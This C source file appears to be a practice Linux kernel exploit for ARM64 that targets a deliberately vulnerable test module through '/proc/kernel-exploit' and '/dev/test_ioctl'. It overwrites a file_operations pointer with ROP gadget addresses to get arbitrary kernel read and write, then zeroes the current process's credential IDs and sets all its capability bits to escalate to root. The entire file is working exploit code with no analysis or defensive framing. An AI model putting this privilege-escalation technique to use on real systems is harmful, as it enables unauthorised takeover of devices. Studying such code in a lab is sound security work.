#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

struct proc_data {
	void *addr;
	unsigned long val;
};

struct task_struct;
#define THREAD_SIZE 4096 * 4

struct thread_info {
        unsigned long           flags;          /* low level flags */
        unsigned long            addr_limit;     /* address limit */
        struct task_struct      *task;          /* main task structure */
        int                     preempt_count;  /* 0 => preemptable, <0 => bug */
        int                     cpu;            /* cpu */
};

#define ioctl_syscall(n, efd, cmd, arg) \
        eabi_syscall(n, efd, cmd, arg)

/*pci_bus_resource_n*/
/*1113454 ffffff80084a2998:       f9400840        ldr     x0, [x2,#16]*/
/*1113455 ffffff80084a299c:       d65f03c0        ret*/

/*do_proc_dointvec_conv*/
  /*70624 ffffff80080c2d0c:       b9000041        str     w1, [x2]*/
  /*70625 ffffff80080c2d10:       d65f03c0        ret*/

/*ffffff8008f34ab8 D test_ioctl_fops*/

#define ROP_WRITE 0xffffff80080c2d0c
#define ROP_READ  0xffffff80084a2998
#define TEST_PRINT 0xffffff800825da5c

static fake_fd;

/*ffffff8008f34ab8 D test_ioctl_fops*/

int trigger(unsigned long dst)
{
	FILE *fd;
	struct proc_data local_data = {0};

	fd = fopen("/proc/kernel-exploit", "w");
	if (fd == NULL) {
		printf("open proc/kernel-exploit error\n");
		return -1;
	}
	unsigned long orig_ops = 0xffffff8008f34ab8;

	local_data.addr = 0xffffff8008f34ab8 + (9 * 8);
	local_data.val = dst;
	fwrite(&local_data, sizeof(long) * 2, 1, fd);
	fclose(fd);
}

static int kernel_write_32(unsigned long addr, unsigned int val)
{
	unsigned long arg;

	trigger(ROP_WRITE);

	arg = addr;
	ioctl_syscall(__NR_ioctl, fake_fd, val, arg);
	return 0;
}

static int kernel_write(unsigned long addr, unsigned long val)
{
	unsigned int val32;

	val32 = (unsigned int)val;
	kernel_write_32(addr, val32);

	val32 = (unsigned int)((val >> 32) & 0xffffffff);
	kernel_write_32(addr + 4, val32);
	return 0;
}

static int kernel_read_32(unsigned long addr, unsigned int *val)
{
	int ret;
	unsigned long arg;

	trigger(ROP_READ);

	arg = addr - 16;
	ret = ioctl_syscall(__NR_ioctl, fake_fd, 0xdeadbeef, arg);
	*val = ret;
	return 0;
}

static int kernel_read(unsigned long address, unsigned long *value)
{
        unsigned int val0, val1;

        kernel_read_32(address, &val0);
        kernel_read_32(address + 4, &val1);
        *value = ((unsigned long)val0 & 0xffffffff | ((unsigned long)val1 << 32) & 0xffffffff00000000);
}


static int do_root(unsigned long stack_buf)
{
	int ret;
	unsigned long task;
	unsigned long i, cred, addr;
	unsigned int tmp0;
	struct cred *task_cred;

	struct thread_info *m_thread = (unsigned long)((unsigned long)stack_buf & (THREAD_SIZE - 1));

	if((unsigned long)m_thread < 0xffffffc000000000) {
		printf("invalid thread_info!");
		return -2;
	}
	task = m_thread->task;
	unsigned long cred_offset = 0x730;
	printf("%lx cred_offset\n", cred_offset);
	cred = task + cred_offset;
	kernel_read(task + cred_offset, &cred);
	printf("%lx cred addr %lx + %x\n", cred, task, cred_offset);
	/*task_cred = task->cred;*/
	/*printf("read cred %lx task cred %lx\n", cred, task_cred);*/
	/*cred = (unsigned long)task_cred;*/

	i = 1;
	addr = cred + 4 * 4;
	/*printf("cred add %lx\n", task_cred);*/
	/*printf("magic var %lx offset %lx magic addr %lx\n", (unsigned long)(task_cred->magic), (unsigned long)&task_cred->magic - (unsigned long)task_cred, &task_cred->magic);*/
	ret = kernel_read_32(addr, &tmp0);
	printf("to read addr %lx\n", addr);
	if(tmp0 == 0x43736564 || tmp0 == 0x44656144) {
		i += 4;
	}
	printf("magic right %lx\n", tmp0);
	addr = cred + (i+0) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+1) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+2) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+3) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+4) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+5) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+6) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i+7) * 4;
	ret = kernel_write_32(addr, 0);

	//securebits: cred[i+8]
	// for full capabilities
	addr = cred + (i+9) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+10) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+11) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+12) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+13) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+14) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+15) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i+16) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	/* success! */
	printf("cred success %lx\n");
	return 0;
}



int test_rop()
{
	int fd = 0;
	int cmd;
	int arg = 0;
	char Buf[4096];
	unsigned long val;


	/*打开设备文件*/
	fake_fd = open("/dev/test_ioctl", O_RDWR);
	if (fd < 0) {
		printf("Open Dev Error!\n");
		return -1;
	}

	/*trigger(TEST_PRINT);*/
	/*ioctl_syscall(__NR_ioctl, fake_fd, 0xdeadbeef, arg);*/
	/*kernel_read(0xffffff80084a2980, &val);*/
	/*printf("val %lx\n", val);*/
	kernel_write(0xffffffc000000000 + 0x80000000, 0xdeadbeefdeadbeaf);
	kernel_read(0xffffffc000000000 + 0x80000000, &val);
	printf("val %lx\n", val);
	/*if (ioctl(fake_fd, 127, &arg) < 0) {*/
		/*printf("Call cmd 127 fail\n");*/
		/*return -1;*/
	/*}*/

	close(fake_fd);
	return 0;
}
